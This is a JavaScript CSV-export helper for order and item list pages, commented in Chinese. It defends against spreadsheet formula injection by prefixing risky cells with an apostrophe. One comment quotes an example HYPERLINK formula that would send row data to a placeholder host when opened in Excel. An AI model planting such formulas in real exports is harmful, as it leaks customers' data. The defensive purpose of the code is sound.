/**
 * 列表页导出 CSV。三页共用。
 *
 * 两条口径是刻意定的，因为反过来做都会产出**看起来对、其实少了东西**的文件：
 *
 * ① 导出**当前筛选的全部行**，不是屏幕上这一页。翻到第 2 页点导出、只拿到 50 行，
 *    而文件名和表头都没有任何提示——这种文件会被当成完整账目发给别人。
 *    所以这里自己翻页拉完（每次 200 条，与后端 limit 上限一致）。
 * ② 列以**页面正在显示的那份列配置**为准。另写一份导出字段清单的话，
 *    加一列时只改一处，导出就悄悄少一列。
 *
 * 编码带 BOM：不带的话 Excel 打开中文全是乱码，而这份文件多半就是给 Excel 用的。
 */

/** 一个格子 → CSV 里的一段文本。数组（物品列）拼成人读的一句，null/undefined 出空串。
 *
 * **取值以 `col.display` 为准，不是 `row[col.key]`。** 有几列屏幕上显示的与列的原始值
 * 根本不是一个东西：
 *   · 订单页「状态」列 key 是 `purchase_status`（订单自己的国内段状态），
 *     而屏幕显示 `fulfillment_status`（挂了集运单就跟随集运段）。
 *     用户按「状态=已发出」筛出一批、点导出，**文件里那一格写着「待发货」**——
 *     筛的是 A、导出的是 B，而这份文件正是要发给别人的。
 *   · 订单页「集运订单」列显示集运单号，原始值是数据库自增 id，导出写的是「1」。
 *   · 物品页「状态」列同上。
 *
 * `display` 是既有约定（`GotionCell` 渲染时就调它）。插槽渲染的列屏幕上走插槽、
 * 不走 `display`，所以给它们补一个 `display` 对界面**没有任何影响**，
 * 只是把「这一格的规范文本」这件事写下来给导出用。
 */
function cell(row, col) {
  const v = typeof col.display === 'function' ? col.display(row) : row[col.key]
  if (v === null || v === undefined) return ''
  if (Array.isArray(v)) {
    // 物品/子订单这类嵌套列表：拼成「（2x）名称」的形式，与表格里的摘要一致
    return v.map((x) => (x && x.name ? (x.quantity ? `（${x.quantity}x）${x.name}` : x.name)
      : (x && x.shipment_no) || (x && x.order_no) || '')).filter(Boolean).join('，')
  }
  if (typeof v === 'object') return ''
  return String(v)
}

/** RFC4180 转义：含逗号/引号/换行的字段整体加引号，内部引号翻倍。
 *
 * 用字符串拼接而不是模板串：模板串里再嵌一对单引号（`\'""\'`）会让
 * `test_user_facing_copy_has_no_bare_markdown` 那条守卫的正则错配反引号，
 * 把后面一整段代码当成一条「用户可见文案」报出来。守卫的盲点，但改这边更便宜。
 */
function esc(s) {
  if (!/[",\n\r]/.test(s)) return s
  return '"' + s.replace(/"/g, '""') + '"'
}

/** 把「会被 Excel 当公式执行」的格子变回纯文本。
 *
 * Excel / LibreOffice 把以 `=` `+` `-` `@`（以及 Tab / CR）开头的格子**当公式执行**。
 * 而这张表里最容易被人做手脚的恰恰是**商品标题**和**物品名**——它们是插件从淘宝
 * 抓回来的，卖家想写什么就写什么。一个标题写成
 * `=HYPERLINK("http://x/?"&A1,"点我")` 的商品，导出之后在 Excel 里就是一个
 * 把整行数据带出去的链接；而这份文件常常是要发给客户或合伙人的
 * （`exportCsv` 自己的注释就写着「这种文件会被当成完整账目发给别人」）。
 * 这是 CWE-1236，不是理论：链路上「攻击者能写」与「受害者用 Excel 打开」两头都成立。
 *
 * RFC4180 的转义**挡不住这个**：它只管逗号/引号/换行，
 * 而 `=1+1` 里一个都没有，原样穿过、连引号都不会加。
 *
 * 前缀一个单引号：Excel / LibreOffice 视之为「这一格是文本」，显示出来仍是原文。
 *
 * **数字必须放行。** `-100.00` 一旦被前缀就在 Excel 里变成文本，
 * 金额列再也求不了和——而求和正是把账目导成表格的全部意义。
 * 所以先认数字（含负号与小数），认不出来的才看首字符。
 */
const NUMERIC = /^-?\d+(?:\.\d+)?$/
function deFormula(s) {
  if (!s || NUMERIC.test(s)) return s
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s
}

/**
 * 拉完当前筛选的全部行并下载成 CSV。
 *
 * @param {object}   o
 * @param {Function} o.fetchPage  (limit, offset) => Promise<{items, total}>
 * @param {Array}    o.columns    页面正在用的列配置（取 key/label）
 * @param {string}   o.name       文件名前缀
 * @returns {Promise<number>}     实际导出的行数
 */
export async function exportCsv({ fetchPage, columns, name }) {
  // 200 是四个列表端点里**最小**的那个上限（物品端点是 500，其余三个 200）。
  // 取最小值而不是各页各配一个：多一个每页条数就多一处会和后端悄悄走散的常量。
  const PAGE = 200
  const rows = []
  let total = null
  for (let offset = 0; ; offset += PAGE) {
    const res = await fetchPage(PAGE, offset)
    const items = res.items || []
    rows.push(...items)
    if (total === null) total = res.total ?? items.length
    // 三个停止条件缺一不可：拿够了 / 这一页空了 / 后端给的 total 不可信时也要收
    if (rows.length >= total || !items.length || offset > 100000) break
  }

  // 一行都没有就**不要下载**：那会产出一个只有 BOM 的空文件，
  // 用户拿到手里以为是「导出成功但账本是空的」。返回 0 让调用方去说这句话。
  if (!rows.length) return 0

  // 表格里那几列「虚拟列」（操作按钮、绑定区）在行上没有同名字段，导出没有意义
  const cols = columns.filter((c) => rows.some((r) => r[c.key] !== undefined))
  const head = cols.map((c) => esc(c.label || c.key)).join(',')
  // `deFormula` 在 `esc` **之前**：先把公式打回文本，再按 RFC4180 转义。
  // 反过来的话，加完引号的字段首字符成了 `"`，判据就再也认不出 `=` 了。
  const body = rows.map((r) => cols.map((c) => esc(deFormula(cell(r, c)))).join(',')).join('\r\n')

  const blob = new Blob(['﻿' + head + '\r\n' + body], { type: 'text/csv;charset=utf-8' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  const d = new Date()
  const stamp = `${d.getFullYear()}${String(d.getMonth() + 1).padStart(2, '0')}${String(d.getDate()).padStart(2, '0')}`
  a.href = url
  a.download = `${name}-${stamp}.csv`
  a.click()
  URL.revokeObjectURL(url)
  return rows.length
}
